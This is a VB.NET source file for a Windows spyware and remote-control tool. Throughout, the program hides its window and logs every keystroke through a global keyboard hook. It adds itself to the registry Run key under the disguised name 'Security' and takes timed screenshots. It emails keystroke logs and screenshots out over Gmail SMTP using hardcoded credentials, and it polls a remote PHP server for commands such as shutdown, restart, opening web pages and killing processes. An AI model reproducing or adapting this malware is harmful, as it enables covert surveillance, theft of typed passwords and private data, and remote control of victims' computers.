' ******************************************************
' *          CREATED BY ABHISHEK DESHKAR               *
' *       {http://www.facebook.com/abhi.pro}    
' *                                                    *
' ******************************************************
Imports System
Imports System.IO
Imports System.Net.Mail
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.Collections.ObjectModel

Public Class Form1

    'CD-DVD drive declaration
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Sub cmdOpenCD_Click()

        mciSendString("set CDAudio door open", Nothing, 0, IntPtr.Zero)
    End Sub
    Private Sub cmdCloseCD_Click()
        mciSendString("set CDAudio door closed", Nothing, 0, IntPtr.Zero)
    End Sub

    'taskbar windows icon declaration


    'Desktop Icon Stuffs
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal _
    lpClassName As String, ByVal lpWindowName As String) As Long
    Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, _
        ByVal wCmd As Long) As Long
    Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, _
        ByVal nCmdShow As Long) As Long
    Private Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, _
        ByVal fEnable As Long) As Long

    Private Const GW_CHILD = 5
    Private Const SW_HIDE = 0
    Private Const SW_SHOW = 5


    Sub ShowDesktopIcons(ByVal bVisible As Integer)
        Dim hWnd_DesktopIcons As Long
        hWnd_DesktopIcons = GetWindow(FindWindow("Progman", "Program Manager"), _
            GW_CHILD)
        If bVisible = 0 Then
            ShowWindow(hWnd_DesktopIcons, SW_SHOW)
        Else
            ShowWindow(hWnd_DesktopIcons, SW_HIDE)
        End If
    End Sub


    'Declaration for keylogger
    Dim Append As String
    Dim WithEvents K As New Keyboard
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim windowTitle As String
    Dim foldersetTime As String = My.Computer.Clock.LocalTime.ToLongDateString()
    Dim ds As DirectoryInfo = New DirectoryInfo("C:\Users")



    Dim log7 As DirectoryInfo = New DirectoryInfo("C:\Users\Public\log")
    Dim logxp As DirectoryInfo = New DirectoryInfo("C:\Documents and Settings\All Users\log")

    '''''''''''''''''''''''''''''''''''''''''''''''
    'Declaration for Screenshot
    Dim pcname As String = "testpc"
    Dim host As String = "http://abhishek123.0fees.us/"
    Dim RegistryKey As Object
    Dim regkey As RegistryKey
    Dim foldertime As String = My.Computer.Clock.LocalTime.ToLongDateString()
    Dim savedir As String


    Dim dx As DirectoryInfo = New DirectoryInfo("C:\Users\Program Files (x86)")
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As IntPtr) As Short
    Private Function getActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        'Keylogger settings
        K.CreateHook()
        Me.Hide()
        ''''''''''''''''''''''' CREATE A FOLDER FOR WINDOWS 7''''''''''''''''''''''

        If log7.Exists Then

        Else
            Directory.CreateDirectory("C:\Users\Public\log")
        End If

        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
        ''''''''''''''''''''''' CREATE A FOLDER FOR WINDOWS XP'''''''''''''''''''''

        If log7.Exists Then

        Else
            Directory.CreateDirectory("C:\Documents and Settings\All Users\log")
        End If

        '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

        If ds.Exists Then
            'Make folder for window 7
            Dim dis As DirectoryInfo = New DirectoryInfo("C:\Users\Public\log\" + foldertime)

            If dis.Exists Then

            Else
                Directory.CreateDirectory("C:\Users\Public\log\" + foldertime)
            End If


        Else
            'Make folder for windows XP
            Dim dic As DirectoryInfo = New DirectoryInfo("C:\Documents and Settings\All Users\log\" + foldertime)

            If dic.Exists Then

            Else
                Directory.CreateDirectory("C:\Documents and Settings\All Users\log\" + foldertime)
            End If
        End If
        Try

        Catch ex As Exception

        End Try
        ''End keylogger settings

        'Registry Settings !
        regkey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        If regkey.GetValue("Security", "") = "" Then
            If dx.Exists Then
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", _
        "Security", "C:\Program Files (x86)\Firewall\Security.exe -silent")
            Else
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", _
        "Security", "C:\Program Files\Firewall\Security.exe -silent")
            End If
        End If

        Try
            'Set users second to zero.
            Dim setUserOfflineReq As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?setUserOffline=" & pcname)
            Dim SendUserOfflineReq As New StreamReader(setUserOfflineReq.GetResponse().GetResponseStream())

        Catch ex As Exception

        End Try

        'Hide the form

        Me.Opacity = 0.0
        Me.Size = New Size(0, 0)
        Me.ShowInTaskbar = False
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.None

        checkurl.Enabled = True
        checkurl.Start()

        'Path settings
        Dim getdir As String = My.Computer.Clock.LocalTime.ToLongDateString()

        ' Make a Dir if it doesn't exist anynmore !
        Dim di As DirectoryInfo = New DirectoryInfo("C:\ScreenShot\" + getdir)
        If di.Exists Then

        Else
            Directory.CreateDirectory("C:\ScreenShot\" + getdir)
        End If

    End Sub
    Dim getsec As String
    Public Sub captureSS()
        ' To take screen shot !
        'Dim Img As New Bitmap(50, 50)
        'Dim g As Graphics = Graphics.FromImage(Img)
        'g.CopyFromScreen(300, 50, 0, 0, Img.Size)
        'g.Dispose()
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        PictureBox1.Image = screenshot
    End Sub
    Dim vals As String
    Dim time As Double
    Dim saveName As String
    Public Sub saveImage()

        ' To store an image to the declared folder !

        time = Now.ToFileTime

        saveName = "C:\ScreenShot\" + foldertime + "\" & time & ".png"
        PictureBox1.Image.Save(saveName)

        'Try
        '''''''''''''''''''''To send an Email to the user

        Dim mail As New MailMessage()
        Dim SmtpServer As New SmtpClient("smtp.gmail.com")
        mail.From = New MailAddress("deshkarabhishek@gmail.com")
        mail.To.Add("abhi.alone@ymail.com")

        mail.Subject = My.Computer.Clock.LocalTime
        mail.Body = My.Computer.Name.ToString

        Dim attachment As System.Net.Mail.Attachment
        attachment = New System.Net.Mail.Attachment(saveName)
        mail.Attachments.Add(attachment)

        SmtpServer.Port = 587
        SmtpServer.Credentials = New System.Net.NetworkCredential("deshkarabhishek@gmail.com", "abhishekpro11!")
        SmtpServer.EnableSsl = True

        SmtpServer.Send(mail)
        ' Catch ex As Exception

        ' End Try
    End Sub



    Private Sub clicktimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles clicktimer.Tick
        captureSS()
        saveImage()
    End Sub

    Private Sub checkurl_Tick(sender As Object, e As EventArgs) Handles checkurl.Tick


        Try
            'Get seconds from the database for screenshot
            Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?name=" & pcname)
            Dim stream As New StreamReader(request.GetResponse().GetResponseStream())
            Dim second As Integer = stream.ReadLine



            'To set user online
            Dim requestOnline As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getuseronlinestatus=" & pcname)
            Dim checkforonline As New StreamReader(requestOnline.GetResponse().GetResponseStream())
            Dim checkonline As Integer = checkforonline.ReadLine


            If checkonline < 1 Then 'Set user to online if second is less than 1

                Dim createOnlineReq As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?setonlinename=" & pcname)
                Dim SetOnlineReq As New StreamReader(createOnlineReq.GetResponse().GetResponseStream())

            End If

            'Converting seconds to miliseconds for clicktimer
            getsec = second * 1000

            'To check if the given second is less than 1 sec.
            If second < 1 Then
                clicktimer.Enabled = False
                clicktimer.Stop()
            Else

                'Timer management
                clicktimer.Enabled = True
                clicktimer.Start()
                clicktimer.Interval = getsec

            End If

        Catch ex As Exception

        End Try


    End Sub



    Private Sub Timerwindow_Tick(sender As Object, e As EventArgs) Handles Timerwindow.Tick
        ' We limit the windowtitlecatches by these names, otherwise the LOG will get large and you wont have the time to read everything!
        Dim allowedList As String = "Face,e,a,b,c,d,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,Youtube,Internet,Google,Microsoft,Windows Explorer,Mozilla,Chrome,Safari,Live,Messenger,Notepad,Skype"
        Dim commaSeparator As Char() = New Char() {","c}
        Dim result As String()
        result = allowedList.Split(commaSeparator, StringSplitOptions.None)

        If windowTitle <> getActiveWindowTitle() Then
            For Each str As String In result
                If getActiveWindowTitle.Contains(str) Then
                    If windowTitle <> getActiveWindowTitle() Then

                        If getActiveWindowTitle() = "Keylogger" Then

                        Else
                            hell.Text = hell.Text + vbNewLine + "[ " + getActiveWindowTitle() + " ]"
                            windowTitle = getActiveWindowTitle()
                        End If
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub K_Down(ByVal Key As String) Handles K.Down
        Append &= Key
        hell.Text &= Key
    End Sub
    Dim dates As String
    Dim min As String
    Dim times As String
    Private Sub TimerSave_Tick(sender As Object, e As EventArgs) Handles TimerSave.Tick
        'Code to save txt files on the Documents and settings or all users
        dates = Now.Hour.ToString()
        min = Now.Minute.ToString()
        times = dates + " " + min



        ' Code to send email.
        Try
            Dim pcname As String
            pcname = My.Computer.Name
            Dim SmtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            SmtpServer.Credentials = New  _
            Net.NetworkCredential("deshkarabhishek@gmail.com", "abhishekpro11!")
            SmtpServer.Port = 587
            SmtpServer.Host = "smtp.gmail.com"
            mail = New MailMessage()
            mail.From = New MailAddress("deshkarabhishek@gmail.com")
            mail.To.Add("deshkarabhishek@gmail.com")
            mail.Subject = pcname & times
            SmtpServer.EnableSsl = True
            mail.Body = hell.Text
            SmtpServer.Send(mail)
        Catch ex As Exception

        End Try

        Try
            If ds.Exists Then
                FileOpen(1, "C:\Users\Public\log\" + foldertime + "\" + time + ".rtf", OpenMode.Output)
                PrintLine(1, hell.Text)
                FileClose()
                hell.Clear()
            Else
                FileOpen(1, "C:\Documents and Settings\All Users\log\" + foldertime + "\" + time + ".rtf", OpenMode.Output)
                PrintLine(1, hell.Text)
                FileClose()
                hell.Clear()
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub TimerCheckDigits_Tick(sender As Object, e As EventArgs) Handles TimerCheckDigits.Tick
        Try

       


        'Shutdown status
        Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?shutdownpcstatus=" & pcname)
        Dim stream As New StreamReader(request.GetResponse().GetResponseStream())
        Dim shut As Integer = stream.ReadLine

        If shut = 1 Then
            'Set shutdown status to zero
            Dim reqShutdownStatusToZero As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?setShutdownZero=" & pcname)
            Dim snedReqShutDownStatusZero As New StreamReader(request.GetResponse().GetResponseStream())

            System.Diagnostics.Process.Start("ShutDown", "/s")

        End If
        

        'restart
        Dim request1 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?restartpcstatus=" & pcname)
        Dim stream1 As New StreamReader(request1.GetResponse().GetResponseStream())
        Dim restart As Integer = stream1.ReadLine

        If restart = 1 Then
            'Set restart status to zero
            Dim reqRestartStatusToZero As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?setRestartZero=" & pcname)
            Dim snedRestartDownStatusZero As New StreamReader(reqRestartStatusToZero.GetResponse().GetResponseStream())

            System.Diagnostics.Process.Start("ShutDown", "/r")

        End If

        'open or close CD ROM
        Dim request2 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?cdromtatus=" & pcname)
        Dim stream2 As New StreamReader(request2.GetResponse().GetResponseStream())
        Dim cdrom As Integer = stream2.ReadLine

        If cdrom = 1 Then


            cmdOpenCD_Click()
        Else

            cmdCloseCD_Click()

        End If
        'Set CD ROM status to zero
        Dim reqCDRomStatusZero As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?cdRomStatusZero=" & pcname)
        Dim snedCDROMSTATUSZERO As New StreamReader(reqCDRomStatusZero.GetResponse().GetResponseStream())


        'Hide desktop
        Dim request3 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?desktopstatus=" & pcname)
        Dim stream3 As New StreamReader(request3.GetResponse().GetResponseStream())
        Dim hidedesk As Integer = stream3.ReadLine

        If hidedesk = 1 Then
            ShowDesktopIcons(1)
        Else
            ShowDesktopIcons(0)
        End If

        'hide desktop status
        Dim sendHideDeskStatus As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?hideDesktopStatusZero=" & pcname)
        Dim sendHideStatusZero As New StreamReader(sendHideDeskStatus.GetResponse().GetResponseStream())


        'send message
        Dim request4 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getmsgstatus=" & pcname)
        Dim stream4 As New StreamReader(request4.GetResponse().GetResponseStream())
        Dim msg As Integer = stream4.ReadLine

        If msg = 1 Then
            'set Message Status to 0
            
            'To get the message
            Dim getMsgReq As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getmessage=" & pcname)
            Dim getmsgStream As New StreamReader(getMsgReq.GetResponse().GetResponseStream())
            Dim getMsg As String = getmsgStream.ReadLine
            Dim request10 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?insertStatusZero=" & pcname)
            Dim insertStatus0 As New StreamReader(request10.GetResponse().GetResponseStream())
            MessageBox.Show(getMsg)


            


        End If
        


        'open Web pages
        Dim request6 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getwebStatus=" & pcname)
        Dim stream6 As New StreamReader(request6.GetResponse().GetResponseStream())
        Dim openwebpage As Integer = stream6.ReadLine


        If openwebpage = 1 Then

            'web string

            Dim webReq As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getwebsite=" & pcname)
            Dim webString As New StreamReader(webReq.GetResponse().GetResponseStream())
            Dim webpage As String = webString.ReadLine

            Dim webAddress As String = webpage
            Process.Start(webAddress)

        End If

        'Set webpage status to zero (0)

        Dim webStatusToZero As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?webstatusZero=" & pcname)
        Dim setToZero As New StreamReader(webStatusToZero.GetResponse().GetResponseStream())



        'Kill process
        Dim request7 As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getProcStatus=" & pcname)
        Dim stream7 As New StreamReader(request7.GetResponse().GetResponseStream())
        Dim killproc As Integer = stream7.ReadLine

        If killproc = 1 Then

            'Get process name
            Dim procreq As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?getProcName=" & pcname)
            Dim procString As New StreamReader(procreq.GetResponse().GetResponseStream())
            Dim processName As String = procString.ReadLine
            Try

            

            For Each prog As Process In Process.GetProcesses
                If prog.ProcessName = processName Then
                    prog.Kill()
                End If
                Next

            Catch ex As Exception

            End Try
        End If
        'set proc status to zero
        Dim procStatusZero As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(host & "index.php?proStatusZero=" & pcname)
        Dim setProcStatusTozero As New StreamReader(procStatusZero.GetResponse().GetResponseStream())

        Catch ex As Exception

        End Try

    End Sub
End Class

Public Class Keyboard
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
    Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
    Public Shared Event Down(ByVal Key As String)
    Public Shared Event Up(ByVal Key As String)
    Private Shared Key As Integer
    Private Shared KHD As KDel
    Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
    Public Sub CreateHook()
        KHD = New KDel(AddressOf Proc)
        Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
    End Sub

    Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        If (Code = 0) Then
            Select Case wParam
                Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
            End Select
        End If
        Return CallNextHookEx(Key, Code, wParam, lParam)
    End Function
    Public Sub DiposeHook()
        UnhookWindowsHookEx(Key)
        MyBase.Finalize()
    End Sub
    Private Function Feed(ByVal e As Keys) As String
        Select Case e
            Case 65 To 90
                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Return e.ToString
                Else
                    Return e.ToString.ToLower
                End If
            Case 48 To 57
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "D1" : Return "!"
                        Case "D2" : Return "@"
                        Case "D3" : Return "#"
                        Case "D4" : Return "$"
                        Case "D5" : Return "%"
                        Case "D6" : Return "^"
                        Case "D7" : Return "&"
                        Case "D8" : Return "*"
                        Case "D9" : Return "("
                        Case "D0" : Return ")"
                    End Select
                Else
                    Return e.ToString.Replace("D", Nothing)
                End If
            Case 96 To 105
                Return e.ToString.Replace("NumPad", Nothing)
            Case 106 To 111
                Select Case e.ToString
                    Case "Divide" : Return "/"
                    Case "Multiply" : Return "*"
                    Case "Subtract" : Return "-"
                    Case "Add" : Return "+"
                    Case "Decimal" : Return "."
                End Select
            Case 32
                Return " "
            Case 186 To 222
                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                    Select Case e.ToString
                        Case "OemMinus" : Return "_"
                        Case "Oemplus" : Return "+"
                        Case "OemOpenBrackets" : Return "{"
                        Case "Oem6" : Return "}"
                        Case "Oem5" : Return "|"
                        Case "Oem1" : Return ":"
                        Case "Oem7" : Return """"
                        Case "Oemcomma" : Return "<"
                        Case "OemPeriod" : Return ">"
                        Case "OemQuestion" : Return "?"
                        Case "Oemtilde" : Return "~"
                    End Select
                Else
                    Select Case e.ToString
                        Case "OemMinus" : Return "-"
                        Case "Oemplus" : Return "="
                        Case "OemOpenBrackets" : Return "["
                        Case "Oem6" : Return "]"
                        Case "Oem5" : Return "\"
                        Case "Oem1" : Return ";"
                        Case "Oem7" : Return "'"
                        Case "Oemcomma" : Return ","
                        Case "OemPeriod" : Return "."
                        Case "OemQuestion" : Return "/"
                        Case "Oemtilde" : Return "`"
                    End Select
                End If
            Case Keys.Return
                Return Environment.NewLine
            Case Else
                Return "<" + e.ToString + ">"
        End Select
        Return Nothing
    End Function
End Class

